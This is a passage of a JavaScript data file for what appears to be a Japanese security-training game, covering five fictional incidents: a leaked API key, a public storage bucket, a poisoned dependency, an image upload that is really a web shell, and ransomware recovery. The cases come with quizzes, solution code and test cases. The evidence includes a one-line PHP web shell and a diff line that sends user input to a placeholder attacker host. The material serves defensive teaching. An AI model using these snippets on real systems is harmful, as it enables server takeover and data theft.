/* 第4章 組織の被害を止める（Level 16〜20） — 登場する組織・人物・URLはすべて架空です。 */
(function (root) {
  "use strict";
  root.HL.addCases([
    // ------------------------------------------------------------------ 16
    {
      id: "case16", level: 16, chapter: 4,
      title: "公開リポジトリの鍵",
      organization: "配車アプリ「ノリアイ」",
      client: { name: "ノリアイ CTO サエキ", role: "スタートアップ" },
      summary: "地図APIの請求が一晩で80万円に跳ね上がった。社員が個人の公開リポジトリに、設定ファイルごとコードを上げていた。",
      request: "コミットはもう削除しました。これで大丈夫ですよね？",
      concepts: ["APIキー", "秘密情報", "失効と再発行"],
      lecture: {
        minutes: 4,
        principle: [
          "APIキーは、サービスに『この利用はノリアイの契約によるものです』と伝える合言葉です。キーを持っている人は誰でも、ノリアイとして、ノリアイの請求で、そのサービスを使えます。",
          "公開リポジトリに上げたファイルは、数分のうちに自動で収集されることがあります。キーを探して回るプログラムが常に動いているからです。コミットを消しても、すでに誰かがコピーしたキーは消えません。また、履歴や複製（フォーク）に残っていることもあります。",
          "だから漏れたキーへの正しい対応は『削除』ではなく『失効と再発行』です。古いキーを使えなくし、新しいキーを安全な場所（秘密情報の管理機能や環境変数）にだけ置きます。再発防止として、コミット前に秘密情報らしい文字列を検査します。",
        ],
        mechanism: {
          intro: "コミットしてよいかを、ファイルの中身で検査する簡単な例です（実際の検査ツールはもっと多くのパターンを見ます）。",
          code: 'const fileName = "config.js";\nconst fileText = "const MAP_KEY = \\"sk_live_9fA2...\\";";\n\nconst hasLiveKey = fileText.includes("sk_live_");\nconst hasPrivateKey = fileText.includes("PRIVATE KEY");\nconst isEnvFile = fileName.endsWith(".env");\n\nif (!hasLiveKey && !hasPrivateKey && !isEnvFile) {\n  console.log("コミットOK");\n} else {\n  console.log("秘密情報らしきものがあります");\n}',
          vars: [
            ["fileName", "コミットしようとしているファイル名"],
            ["fileText", "ファイルの中身"],
            ["hasLiveKey", "本番用キーの目印 sk_live_ を含むか"],
            ["isEnvFile", "秘密情報を入れる .env ファイルか"],
          ],
          flow: [
            "ファイル名だけでなく中身も見ます。キーは config.js のような普通の名前のファイルに書かれがちです。",
            "! で『含まない』に変えて、すべて含まないときだけ OK にします。",
            "検査は保険です。漏れたら失効・再発行が最優先、は変わりません。",
          ],
        },
        apply: {
          look: ["公開された時刻と、APIの利用急増の時刻", "コミットされたファイルの中身", "キーの失効状況"],
          allow: ["秘密情報を含まないコードのコミット"],
          block: ["本番キーを含む設定ファイル", ".env ファイル", "秘密鍵ファイル"],
        },
        quiz: [
          {
            q: "公開リポジトリにキーを上げてしまった。最初にやることは？",
            options: ["コミットを削除する", "キーを失効させ、新しいキーを発行する", "リポジトリ名を変える"],
            answer: 1,
            explain: ["削除してもコピーされたキーは使えます。", "正解。漏れたキーを使えなくすることが最優先です。", "名前を変えても中身は残ります。"],
          },
          {
            q: "fileName が \"config.js\" で中身に sk_live_ を含む。ファイル名だけ見る検査だと？",
            options: ["止められる", "止められない"],
            answer: 1,
            explain: ["config.js は普通の名前なので、名前だけでは見逃します。", "正解。中身の検査が必要です。"],
          },
        ],
      },
      evidence: [
        { id: "e1", type: "log", title: "リポジトリの履歴", meta: "github.example/kenta-dev/noriai-proto", lines: ["10/09 23:02 公開リポジトリへ push: src/config.js", "  const MAP_KEY = \"sk_live_9fA2…\"", "10/10 08:15 コミットを削除（force push）"], key: true },
        { id: "e2", type: "ledger", title: "地図APIの利用量", meta: "キー sk_live_9fA2…", lines: ["10/09 23:00 まで: 1時間あたり約300回", "10/09 23:09 以降: 1時間あたり約41万回（海外の複数IP）", "10/10 08:15 以降も継続"], key: true },
        { id: "e3", type: "config", title: "キー管理画面", meta: "地図API", lines: ["sk_live_9fA2…: 有効（作成 2025/04、失効なし）", "利用元の制限: なし"], key: true },
        { id: "e4", type: "screen", title: "社内チャット", meta: "kenta", lines: ["家で試すために個人のリポジトリに上げました。すぐ消しました"], key: false, note: "経緯。原因の判断材料は e1〜e3。" },
      ],
      hypotheses: [
        { id: "h1", text: "公開されたキーが収集されて悪用され、削除後もキーが有効なまま使われ続けている", correct: true },
        { id: "h2", text: "地図APIの会社の請求システムの誤り", correct: false, why: "利用急増は公開の7分後から海外IPで始まっており、実際の利用があります。" },
        { id: "h3", text: "削除したので現在の利用は社内のテスト", correct: false, why: "削除後も海外IPからの利用が続いており、キーは失効されていません。" },
      ],
      codeTask: "コミットしてよいかを判定してください。今のコードは .env という名前だけを止めています。",
      inputs: [["fileName", "ファイル名"], ["fileText", "ファイルの中身"]],
      starterCode: 'if (fileName.endsWith(".env")) {\n  return false;\n} else {\n  return true;\n}',
      solutionCode: 'const hasLiveKey = fileText.includes("sk_live_");\nconst hasPrivateKey = fileText.includes("PRIVATE KEY");\nconst isEnvFile = fileName.endsWith(".env");\n\nif (!hasLiveKey && !hasPrivateKey && !isEnvFile) {\n  return true;\n} else {\n  return false;\n}',
      testCases: [
        { name: "普通のコード", input: { fileName: "route.js", fileText: "const speed = 40;" }, expected: true },
        { name: "今回の config.js（本番キー入り）", input: { fileName: "src/config.js", fileText: "const MAP_KEY = \"sk_live_9fA2xx\";" }, expected: false },
        { name: ".env ファイル", input: { fileName: ".env", fileText: "MAP_KEY=..." }, expected: false },
        { name: "秘密鍵ファイル", input: { fileName: "deploy.pem", fileText: "-----BEGIN PRIVATE KEY-----" }, expected: false },
        { name: "テスト用の偽キー（環境変数参照）", input: { fileName: "config.js", fileText: "const MAP_KEY = env.MAP_KEY;" }, expected: true, note: "キー本体を書かず、安全な場所から読む書き方は通す" },
      ],
      responseActions: [
        { id: "a1", label: "漏れたキーを失効させ、新しいキーを発行して安全な保管場所に置く", effect: "good", urgent: true, feedback: "これで不正利用が止まります。最優先です。" },
        { id: "a2", label: "新しいキーに利用元の制限（自社のアプリ・サーバーのみ）をかける", effect: "good", feedback: "万一また漏れても、悪用しにくくなります。" },
        { id: "a3", label: "地図APIの会社に不正利用を報告し、請求について相談する", effect: "good", feedback: "減額などの対応があるかは相手の規約次第です。" },
        { id: "a4", label: "コミットを削除したので、キーはそのまま使い続ける", effect: "bad", feedback: "コピーされたキーで不正利用が続きます。" },
      ],
      report: {
        residual: [
          { text: "同じリポジトリにほかの秘密情報が含まれていなかったか確認する", correct: true },
          { text: "コミット前の秘密情報検査を全員の環境に入れる", correct: true },
          { text: "請求は必ず全額取り消されるので心配ない", correct: false },
        ],
      },
      nova: {
        evidence: "公開の時刻と利用急増の時刻の差は何分？ 削除した後の利用量にも注目。キー管理画面の『有効』の文字も。",
        code: "名前だけでなく中身。でも『env.MAP_KEY のように安全に読む書き方』まで止めると開発が止まっちゃう。最後のテストがその確認。",
      },
    },

    // ------------------------------------------------------------------ 17
    {
      id: "case17", level: 17, chapter: 4,
      title: "誰でも読める保管庫",
      organization: "健康診断センター「ミドリ健診」",
      client: { name: "ミドリ健診 情報システム課 イトウ", role: "医療関連施設" },
      summary: "受診者の結果PDFを置いたクラウドの保管庫（ストレージ）が、インターネットの誰からでも読める設定になっていた。外部の研究者から通報が届いた。",
      request: "業者に任せていた設定です。何が問題で、どう直せばいいのか、ほかの保管庫も含めて見てください。",
      concepts: ["クラウド設定", "最小権限"],
      lecture: {
        minutes: 4,
        principle: [
          "クラウドの保管庫は、設定ひとつで『社内の決まった人だけ』にも『インターネットの全員』にもなります。サーバーへの侵入がなくても、設定の誤りだけで中身がそのまま読めてしまいます。",
          "最小権限とは、『その人（またはプログラム）が仕事をするのに必要な最小限の権限だけを与える』という原則です。結果PDFを作るプログラムには書き込みだけ、受付スタッフには自分の担当分の閲覧だけ、という具合です。",
          "便利だからと『全員に読み取り許可』『管理者権限を全員に』とすると、どこか一か所が漏れたときの被害が最大になります。設定は、誰が・何を・どの範囲で、を一覧にして見直します。",
        ],
        mechanism: {
          intro: "保管庫へのアクセス要求を、要求者の役割と許可リストで判定します。",
          code: 'const bucket = { publicRead: true, readers: ["doctor", "report-service"] };\nconst requester = { authenticated: false, role: "anonymous" };\n\nconst isAllowedRole = bucket.readers.includes(requester.role);\n\nif (!bucket.publicRead && requester.authenticated && isAllowedRole) {\n  console.log("読み取り許可");\n} else {\n  console.log("拒否");\n}',
          vars: [
            ["bucket.publicRead", "インターネットの誰でも読める設定か"],
            ["bucket.readers", "読み取りを許可する役割の一覧"],
            ["requester.authenticated", "要求者が認証済みか"],
            ["requester.role", "要求者の役割"],
          ],
          flow: [
            "publicRead が true の保管庫は、それだけで危険な設定です（機密データの場合）。",
            "認証済みであることと、役割が許可リストに入っていることを両方確かめます。",
            "許可リストは『必要な役割だけ』にします。",
          ],
        },
        apply: {
          look: ["保管庫の公開設定", "アクセスログに出てくる匿名アクセス", "許可されている役割の数"],
          allow: ["認証済みの医師が結果を閲覧", "結果作成サービスがファイルを読み込む"],
          block: ["匿名の誰か", "認証済みでも許可リストにない役割（例: 広報担当）"],
        },
        quiz: [
          {
            q: "最小権限の原則に沿っているのはどれ？",
            options: ["全員に管理者権限を与え、使わない人は使わなければよい", "必要な人に、必要な操作だけを許可する"],
            answer: 1,
            explain: ["持っているだけで、漏れたときの被害が大きくなります。", "正解。"],
          },
          {
            q: "サーバーへの侵入がないのに機密データが読まれた。考えられる原因は？",
            options: ["保管庫の公開設定の誤り", "ありえない。侵入がなければ漏れない"],
            answer: 0,
            explain: ["正解。設定ミスだけで漏えいは起こります。", "公開設定なら、侵入しなくても読めてしまいます。"],
          },
        ],
      },
      evidence: [
        { id: "e1", type: "config", title: "保管庫の設定", meta: "midori-results-2025", lines: ["公開アクセス: 全員に読み取り許可", "一覧の表示: 全員に許可", "作成: 委託業者（2025/02）"], key: true },
        { id: "e2", type: "log", title: "アクセスログ", meta: "直近30日", lines: ["匿名からの一覧取得 41回", "匿名からの PDF ダウンロード 3,118件（複数の国）"], key: true },
        { id: "e3", type: "chat", title: "外部研究者からの通報", meta: "10/08", lines: ["公開されている保管庫を調査中に見つけました。中身は開いていません。", "URL: https://storage.cloud.example/midori-results-2025/"], key: true },
        { id: "e4", type: "config", title: "役割と権限の一覧", meta: "IAM", lines: ["受付スタッフ 32名: 全保管庫の管理者権限", "結果作成サービス: 全保管庫の管理者権限"], key: true },
      ],
      hypotheses: [
        { id: "h1", text: "保管庫が全員に公開され、さらに権限が必要以上に広く設定されていた", correct: true },
        { id: "h2", text: "通報した研究者が侵入してデータを盗んだ", correct: false, why: "公開設定で誰でも読める状態でした。ダウンロードは複数の国から3千件以上あります。" },
        { id: "h3", text: "クラウド事業者側のシステム障害", correct: false, why: "公開設定は委託業者が作成時に設定したものです。" },
      ],
      codeTask: "保管庫の読み取りを許可するかを判定してください。今のコードは公開設定なら誰でも、認証済みなら誰でも許可します。",
      inputs: [["bucket", "{ publicRead, readers }"], ["requester", "{ authenticated, role }"]],
      starterCode: 'if (bucket.publicRead || requester.authenticated) {\n  return true;\n} else {\n  return false;\n}',
      solutionCode: 'const isAllowedRole = bucket.readers.includes(requester.role);\n\nif (!bucket.publicRead && requester.authenticated && isAllowedRole) {\n  return true;\n} else {\n  return false;\n}',
      testCases: [
        { name: "認証済みの医師", input: { bucket: { publicRead: false, readers: ["doctor", "report-service"] }, requester: { authenticated: true, role: "doctor" } }, expected: true },
        { name: "匿名アクセス（今回の公開設定）", input: { bucket: { publicRead: true, readers: ["doctor"] }, requester: { authenticated: false, role: "anonymous" } }, expected: false },
        { name: "認証済みだが許可外の広報", input: { bucket: { publicRead: false, readers: ["doctor", "report-service"] }, requester: { authenticated: true, role: "pr-staff" } }, expected: false },
        { name: "結果作成サービス", input: { bucket: { publicRead: false, readers: ["doctor", "report-service"] }, requester: { authenticated: true, role: "report-service" } }, expected: true },
      ],
      responseActions: [
        { id: "a1", label: "保管庫の公開アクセスと一覧表示をただちに無効にする", effect: "good", urgent: true, feedback: "これ以上のダウンロードを止めます。" },
        { id: "a2", label: "アクセスログを保全し、ダウンロードされたファイルと受診者を特定する", effect: "good", urgent: true, feedback: "通知の対象と、所管官庁への報告内容を確定します。" },
        { id: "a3", label: "受付スタッフとサービスの権限を、必要な範囲だけに縮小する", effect: "good", feedback: "最小権限の原則に沿った見直しです。" },
        { id: "a4", label: "通報した研究者を不正アクセスで訴える準備をする", effect: "bad", feedback: "善意の通報者を敵に回すと、今後の通報が来なくなります。まず事実確認と感謝です。" },
      ],
      report: {
        residual: [
          { text: "ほかの保管庫の公開設定と権限を一括で点検する", correct: true },
          { text: "個人情報保護の規則に沿って、本人と関係機関への報告を行う", correct: true },
          { text: "公開設定を戻したので、流出したデータも回収できた", correct: false },
        ],
      },
      nova: {
        evidence: "設定・ログ・権限一覧の3つで『誰が・何を・どこまで』できるかを表にしてみよう。",
        code: "公開設定は止める、認証済み、役割が許可リストにある。|| で全部ゆるめている今のコードと比べてみて。",
      },
    },

    // ------------------------------------------------------------------ 18
    {
      id: "case18", level: 18, chapter: 4,
      title: "更新に紛れた異物",
      organization: "会計ソフト「カケイボPro」",
      client: { name: "カケイボPro 開発リーダー モリ", role: "ソフトウェア開発" },
      summary: "日付整形用の小さな部品（パッケージ）を自動更新したら、ビルドしたアプリが顧客の入力内容を外部に送っていた。",
      request: "うちのコードは変えていません。部品を最新にしただけです。",
      concepts: ["依存パッケージ", "供給網", "変更審査"],
      lecture: {
        minutes: 5,
        principle: [
          "現代のソフトウェアは、他人が作った部品（パッケージ）を何十、何百と組み合わせて作られます。部品はさらに別の部品を使っています。この部品の流れをソフトウェアの供給網（サプライチェーン）と呼びます。",
          "部品の作者のアカウントが乗っ取られたり、作者が交代したりすると、新しいバージョンに悪意のあるコードが入ることがあります。自動で最新に更新していると、自分のコードを1行も変えずに異物を取り込んでしまいます。",
          "守り方は、①使うバージョンを固定し（ロックファイル）、中身の指紋（ハッシュ）を照合する、②更新は人が差分を審査してから入れる、③公開者の変化やインストール時に動くスクリプトなどの怪しい兆候に注意する、の3つです。",
        ],
        mechanism: {
          intro: "部品の更新を取り込んでよいかを判定します。",
          code: 'const pkg = {\n  name: "date-tidy",\n  publisher: "new-maintainer-x",   // 今回の公開者\n  hasInstallScript: true,          // インストール時に動くスクリプト\n  integrityMatches: true           // 審査した版と指紋が一致するか\n};\nconst expectedPublisher = "tidy-team";\nconst reviewApproved = false;      // 人による差分審査\n\nconst publisherOk = pkg.publisher === expectedPublisher;\nif (publisherOk && pkg.integrityMatches && reviewApproved) {\n  console.log("取り込む");\n}',
          vars: [
            ["pkg.publisher", "そのバージョンを公開したアカウント"],
            ["expectedPublisher", "これまでの公開者"],
            ["pkg.integrityMatches", "審査した版の指紋（ハッシュ）と一致するか"],
            ["reviewApproved", "人が変更内容を確認して承認したか"],
          ],
          flow: [
            "公開者の変化は、それだけで悪とは限りませんが、審査なしで取り込む理由にはなりません。",
            "指紋の一致は『審査したものと同じものが届いた』ことの確認です。",
            "3つを && でつなぎ、どれか欠けたら取り込みません。",
          ],
        },
        apply: {
          look: ["更新された部品のバージョンと公開者", "部品の差分（追加されたコード）", "ビルド後のアプリの通信先"],
          allow: ["いつもの公開者の版を審査・承認し、指紋も一致"],
          block: ["公開者が突然変わった未審査の版", "審査した版と指紋が違う版"],
        },
        quiz: [
          {
            q: "自分のコードを変えていないのに、アプリに悪いコードが入った。考えられる経路は？",
            options: ["依存パッケージの更新", "ありえない"],
            answer: 0,
            explain: ["正解。部品経由で入るのが供給網攻撃です。", "部品の中身は外から変わりえます。"],
          },
          {
            q: "ロックファイルと指紋の照合の役割は？",
            options: ["常に最新版を使うため", "審査した版と同じものだけを使うため"],
            answer: 1,
            explain: ["逆です。勝手に最新にならないよう固定します。", "正解。"],
          },
        ],
      },
      evidence: [
        { id: "e1", type: "log", title: "依存関係の更新記録", meta: "自動更新ボット", lines: ["date-tidy 2.4.1 → 2.4.2（自動マージ）", "2.4.2 公開者: new-maintainer-x（2.4.1 までは tidy-team）", "レビュー: なし"], key: true },
        { id: "e2", type: "code", title: "date-tidy 2.4.2 の差分（抜粋）", meta: "追加されたコード", lines: ["+ onInput(v => send('https://collect.badhost.example', v))", "+ \"postinstall\": \"node setup.js\""], key: true },
        { id: "e3", type: "log", title: "アプリの通信記録", meta: "顧客PC", lines: ["collect.badhost.example へ送信 1,204回（入力内容を含む）"], key: true },
        { id: "e4", type: "config", title: "ビルド設定", meta: "package 設定", lines: ["バージョン指定: \"^2.4.0\"（互換版は自動で最新）", "ロックファイル: CI で再生成"], key: true },
      ],
      hypotheses: [
        { id: "h1", text: "公開者が変わった依存パッケージの新版を、審査や固定なしに自動で取り込んだ", correct: true },
        { id: "h2", text: "カケイボProのサーバーに侵入され、コードが書き換えられた", correct: false, why: "変更は date-tidy の新版の差分に含まれていました。" },
        { id: "h3", text: "顧客のPCがウイルスに感染していた", correct: false, why: "送信はアプリに組み込まれた部品のコードから行われています。" },
      ],
      codeTask: "部品の更新を取り込んでよいかを判定してください。今のコードは名前が合っていれば取り込みます。",
      inputs: [["pkg", "{ name, publisher, integrityMatches }"], ["expectedPublisher", "これまでの公開者"], ["reviewApproved", "差分審査の承認"]],
      starterCode: 'if (pkg.name === "date-tidy") {\n  return true;\n} else {\n  return false;\n}',
      solutionCode: 'const publisherOk = pkg.publisher === expectedPublisher;\n\nif (publisherOk && pkg.integrityMatches && reviewApproved) {\n  return true;\n} else {\n  return false;\n}',
      testCases: [
        { name: "いつもの公開者・審査済み", input: { pkg: { name: "date-tidy", publisher: "tidy-team", integrityMatches: true }, expectedPublisher: "tidy-team", reviewApproved: true }, expected: true },
        { name: "今回の 2.4.2", input: { pkg: { name: "date-tidy", publisher: "new-maintainer-x", integrityMatches: true }, expectedPublisher: "tidy-team", reviewApproved: false }, expected: false },
        { name: "審査済みだが指紋不一致", input: { pkg: { name: "date-tidy", publisher: "tidy-team", integrityMatches: false }, expectedPublisher: "tidy-team", reviewApproved: true }, expected: false },
        { name: "いつもの公開者だが未審査", input: { pkg: { name: "date-tidy", publisher: "tidy-team", integrityMatches: true }, expectedPublisher: "tidy-team", reviewApproved: false }, expected: false },
      ],
      responseActions: [
        { id: "a1", label: "date-tidy を安全な 2.4.1 に戻した版を緊急リリースする", effect: "good", urgent: true, feedback: "顧客の手元の送信を止めるには、修正版の配布が必要です。" },
        { id: "a2", label: "送信先ドメインへの通信を社内・顧客向けに遮断する案内を出す", effect: "good", urgent: true, feedback: "修正版が行き渡るまでの被害を減らします。" },
        { id: "a3", label: "バージョンを固定し、依存の更新は差分審査を必須にする", effect: "good", feedback: "再発防止です。" },
        { id: "a4", label: "依存パッケージを全部最新に上げて上書きする", effect: "bad", feedback: "未審査の部品をさらに取り込むことになります。" },
      ],
      report: {
        residual: [
          { text: "送信された入力内容の範囲と顧客を特定し、通知する", correct: true },
          { text: "パッケージ公開元のレジストリへ悪性版を報告する", correct: true },
          { text: "外部の部品は二度と使わない", correct: false },
        ],
      },
      nova: {
        evidence: "更新記録の『公開者』が変わっていない？ 差分に追加された送信先と、通信記録の送信先を比べてみよう。",
        code: "公開者・指紋・審査の3つ。いつもの公開者でも未審査なら通さない、がテスト4。",
      },
    },

    // ------------------------------------------------------------------ 19
    {
      id: "case19", level: 19, chapter: 4,
      title: "画像のふりをしたファイル",
      organization: "地域掲示板「マチノワ」",
      client: { name: "マチノワ 管理人 タナベ", role: "コミュニティサイト" },
      summary: "プロフィール画像としてアップロードされた profile.png.php が、サーバー上でプログラムとして実行され、管理画面が改ざんされた。",
      request: "画像しか受け付けないように、拡張子が .png か確認していたつもりでした。",
      concepts: ["ファイル内容検証", "サイズ制限", "実行不可の保存先"],
      lecture: {
        minutes: 4,
        principle: [
          "ファイル名や拡張子は、アップロードする人が自由に付けられるラベルです。中身がプログラムでも、名前を photo.png にすることはできます。だから受け付ける側は、ファイルの中身そのもの（先頭の決まったバイト列など）から種類を判定します。",
          "もう一つの守りは保存先です。アップロードされたファイルを、サーバーがプログラムとして実行する場所に置くと、名前の判定をすり抜けたとき即座に乗っ取られます。保存先は『実行されない場所』にし、名前もサーバー側で付け直します。",
          "さらにサイズに上限を設けます。巨大なファイルでサーバーの容量や処理を使い切られるのを防ぐためです。",
        ],
        mechanism: {
          intro: "アップロードを受け付けてよいかを、中身・サイズ・保存先で判定します。",
          code: 'const file = { name: "profile.png.php", detectedType: "text/x-php", size: 2400 };\nconst saveDirExecutable = true;\n\nconst isImage = file.detectedType === "image/png" || file.detectedType === "image/jpeg";\nconst smallEnough = file.size <= 5000000; // 5MB\n\nif (isImage && smallEnough && !saveDirExecutable) {\n  console.log("保存（名前はサーバーで付け直す）");\n} else {\n  console.log("拒否");\n}',
          vars: [
            ["file.name", "アップロードした人が付けた名前（信用しない）"],
            ["file.detectedType", "中身の先頭バイトから判定した本当の種類"],
            ["file.size", "ファイルの大きさ（バイト）"],
            ["saveDirExecutable", "保存先がプログラムとして実行される場所か"],
          ],
          flow: [
            "|| で『PNG または JPEG』を表し、そのまとまりを && で他の条件とつなぎます。",
            "5000000 は5MB。<= で上限以下を許可します。",
            "名前は判定に使いません。profile.png.php のように最後の拡張子を偽ることもできます。",
          ],
        },
        apply: {
          look: ["アップロードされたファイル名と中身の種類", "保存先ディレクトリの設定", "そのファイルへのアクセス記録"],
          allow: ["中身がPNG/JPEGで5MB以下、実行されない保存先"],
          block: ["名前が .png でも中身がプログラム", "50MBの画像", "実行される保存先への保存"],
        },
        quiz: [
          {
            q: "ファイルの種類を判定するのに使うべきものは？",
            options: ["拡張子", "中身の先頭バイトなど、中身から判定した種類"],
            answer: 1,
            explain: ["拡張子は誰でも付け替えられます。", "正解。"],
          },
          {
            q: "保存先を『実行されない場所』にする理由は？",
            options: ["容量を節約するため", "判定をすり抜けたファイルがあってもプログラムとして動かないようにするため"],
            answer: 1,
            explain: ["容量とは関係ありません。", "正解。多層の守りです。"],
          },
        ],
      },
      evidence: [
        { id: "e1", type: "log", title: "アップロード記録", meta: "user=machi_new01", lines: ["profile.png.php（2.4KB）を /uploads/ に保存", "判定: ファイル名に .png を含むためOK"], key: true },
        { id: "e2", type: "log", title: "Webサーバーのアクセス記録", meta: "", lines: ["GET /uploads/profile.png.php?cmd=... → 200（PHPとして実行）", "その後 管理画面のテンプレートが書き換えられる"], key: true },
        { id: "e3", type: "config", title: "サーバー設定", meta: "", lines: ["/uploads/ : スクリプト実行 有効", "アップロード上限: なし"], key: true },
        { id: "e4", type: "code", title: "ファイル中身の先頭", meta: "profile.png.php", lines: ["<?php system($_GET['cmd']); ?>", "（PNGの先頭バイトなし）"], key: true },
      ],
      hypotheses: [
        { id: "h1", text: "名前だけで画像と判定し、中身がプログラムのファイルを実行される場所に保存した", correct: true },
        { id: "h2", text: "管理人のパスワードが漏れて管理画面にログインされた", correct: false, why: "書き換えはアップロードされたファイル経由で行われています。" },
        { id: "h3", text: "画像ファイルにウイルスが感染していた", correct: false, why: "中身は最初から画像ではなくプログラムでした。" },
      ],
      codeTask: "アップロードを受け付けてよいかを判定してください。今のコードは名前に .png を含めば通します。",
      inputs: [["file", "{ name, detectedType, size }"], ["saveDirExecutable", "保存先が実行可能か"]],
      starterCode: 'if (file.name.includes(".png") || file.name.includes(".jpg")) {\n  return true;\n} else {\n  return false;\n}',
      solutionCode: 'const isImage = file.detectedType === "image/png" || file.detectedType === "image/jpeg";\nconst smallEnough = file.size <= 5000000;\n\nif (isImage && smallEnough && !saveDirExecutable) {\n  return true;\n} else {\n  return false;\n}',
      testCases: [
        { name: "普通のPNG画像", input: { file: { name: "cat.png", detectedType: "image/png", size: 820000 }, saveDirExecutable: false }, expected: true },
        { name: "名前は jpg でない本物のJPEG", input: { file: { name: "IMG_0042", detectedType: "image/jpeg", size: 1500000 }, saveDirExecutable: false }, expected: true, note: "名前に頼らないので正しく通る" },
        { name: "今回の profile.png.php", input: { file: { name: "profile.png.php", detectedType: "text/x-php", size: 2400 }, saveDirExecutable: false }, expected: false },
        { name: "巨大な画像", input: { file: { name: "big.png", detectedType: "image/png", size: 52000000 }, saveDirExecutable: false }, expected: false },
        { name: "実行される保存先", input: { file: { name: "cat.png", detectedType: "image/png", size: 820000 }, saveDirExecutable: true }, expected: false },
      ],
      responseActions: [
        { id: "a1", label: "サイトをメンテナンス表示にし、不正なファイルとログを保全する", effect: "good", urgent: true, feedback: "被害の拡大を止め、調査の材料を残します。" },
        { id: "a2", label: "/uploads/ のスクリプト実行を無効にする", effect: "good", urgent: true, feedback: "同じ手口のファイルが動かなくなります。" },
        { id: "a3", label: "書き換えられた管理画面を、改ざん前のバックアップから戻す", effect: "good", feedback: "他にも仕込まれていないか確認しながら戻します。" },
        { id: "a4", label: "profile.png.php だけ削除して通常運転に戻る", effect: "bad", feedback: "ほかに裏口が仕込まれている可能性を確かめていません。" },
      ],
      report: {
        residual: [
          { text: "サーバー上にほかの不審なファイルや裏口がないか全体を点検する", correct: true },
          { text: "管理画面のパスワードや鍵を変更する", correct: true },
          { text: "拡張子のチェックを厳しくすれば中身の検査は不要", correct: false },
        ],
      },
      nova: {
        evidence: "アップロード記録の『判定』の理由と、ファイルの先頭の中身を比べて。サーバー設定の /uploads/ も見逃さないで。",
        code: "名前（file.name）は使わないのがコツ。2番目のテストは『名前に頼ると落ちる』ように作ってあるよ。",
      },
    },

    // ------------------------------------------------------------------ 20
    {
      id: "case20", level: 20, chapter: 4,
      title: "午前2時のブラックアウト",
      organization: "物流倉庫「ハヤテ運輸」",
      client: { name: "ハヤテ運輸 情報システム部長 クドウ", role: "物流会社" },
      summary: "午前2時、倉庫管理サーバーのファイルが次々と暗号化され、身代金を要求する画面が出た。朝6時には出荷が始まる。",
      request: "とにかく早く戻したいです。バックアップはあるはずですが、どれを使えばいいか分かりません。",
      concepts: ["隔離", "証拠保全", "バックアップ", "段階復旧"],
      lecture: {
        minutes: 5,
        principle: [
          "ランサムウェアは、ファイルを暗号化して使えなくし、元に戻す代わりに金銭を要求する攻撃です。最近は暗号化の前にデータを盗み出し、『公開する』と二重に脅す手口もあります。",
          "最初にすべきは隔離です。感染した機械をネットワークから切り離し、被害が他の機械へ広がるのを止めます。このとき電源をいきなり切ると、メモリ上の手がかりが消えることがあるため、証拠を残す手順を決めておきます。ログやディスクの複製を保全してから調査します。",
          "復旧はバックアップから行いますが、『感染する前に取られ、感染していない、攻撃者が触れない場所にあった』バックアップでなければ、戻した瞬間に再び暗号化されます。重要なシステムから段階的に戻し、各段階で異常がないか確かめながら広げます。",
        ],
        mechanism: {
          intro: "どのバックアップから戻してよいかを判定します。",
          code: 'const infectionStart = 1380; // 侵入が始まった時刻（調査で判明、分）\nconst backup = { takenAt: 1500, scanClean: false, isolatedCopy: true };\n\nconst beforeInfection = backup.takenAt < infectionStart;\n\nif (beforeInfection && backup.scanClean && backup.isolatedCopy) {\n  console.log("このバックアップで段階復旧");\n} else {\n  console.log("使わない");\n}',
          vars: [
            ["infectionStart", "攻撃者が最初に侵入した時刻（暗号化の時刻より前のことが多い）"],
            ["backup.takenAt", "バックアップを取った時刻"],
            ["backup.scanClean", "不正なプログラムの検査で問題がなかったか"],
            ["backup.isolatedCopy", "ネットワークから切り離された、書き換えられない保管場所の複製か"],
          ],
          flow: [
            "暗号化された時刻ではなく『侵入が始まった時刻』より前のものを選びます。侵入から暗号化までの間に、裏口が仕込まれていることがあるからです。",
            "隔離された複製でなければ、攻撃者に消されたり暗号化されたりしている可能性があります。",
          ],
        },
        apply: {
          look: ["最初の不審なログインの時刻", "各バックアップの取得時刻・保管場所・検査結果", "暗号化が広がった順番"],
          allow: ["侵入前に取得・検査済み・隔離保管のバックアップ"],
          block: ["侵入後のバックアップ", "同じネットワーク上の共有フォルダのバックアップ", "未検査のバックアップ"],
        },
        quiz: [
          {
            q: "ランサムウェアを見つけたら最初にすること（初動）は？",
            options: ["感染した機械をネットワークから隔離する", "すぐに身代金を払う", "とりあえず全台を再起動する"],
            answer: 0,
            explain: ["正解。被害の広がりを止めます。", "払っても戻る保証はなく、さらなる攻撃の資金にもなります。", "再起動で手がかりが消えたり、暗号化が進んだりすることがあります。"],
          },
          {
            q: "暗号化は2:00、最初の侵入は前日23:00。使うべきバックアップは？",
            options: ["前日24:00のもの", "前日22:00のもの"],
            answer: 1,
            explain: ["侵入後なので、裏口が含まれているかもしれません。", "正解。侵入より前のものを選びます。"],
          },
        ],
      },
      evidence: [
        { id: "e1", type: "log", title: "認証ログ", meta: "VPN装置", lines: ["前日 23:00 admin_old でVPNログイン成功（退職者アカウント）", "前日 23:20 倉庫管理サーバーへ接続", "当日 01:10 大量のファイルを外部へ送信"], key: true },
        { id: "e2", type: "screen", title: "サーバーの画面", meta: "当日 02:03", lines: ["YOUR FILES ARE ENCRYPTED", "支払わなければ盗んだデータを公開する"], key: true },
        { id: "e3", type: "config", title: "バックアップ一覧", meta: "", lines: ["B1 前日 22:00 / 隔離保管（書き換え不可）/ 検査: 異常なし", "B2 当日 00:00 / 共有フォルダ / 検査: 未実施", "B3 当日 01:30 / 共有フォルダ / 暗号化済み"], key: true },
        { id: "e4", type: "config", title: "アカウント台帳", meta: "", lines: ["admin_old: 2年前に退職、無効化されていない"], key: true },
      ],
      hypotheses: [
        { id: "h1", text: "無効化されていない退職者アカウントでVPNから侵入され、データを盗まれた後に暗号化された", correct: true },
        { id: "h2", text: "社員がメールの添付ファイルを開いて感染した", correct: false, why: "ログでは退職者アカウントのVPNログインから始まっています。" },
        { id: "h3", text: "倉庫管理サーバーのハードディスクの故障", correct: false, why: "要求画面と大量の外部送信があり、攻撃です。" },
      ],
      codeTask: "復旧に使ってよいバックアップかを判定してください。今のコードはバックアップがあれば何でも使います。",
      inputs: [["backup", "{ exists, takenAt, scanClean, isolatedCopy }"], ["infectionStart", "侵入開始の時刻（分）"]],
      starterCode: 'if (backup.exists) {\n  return true;\n} else {\n  return false;\n}',
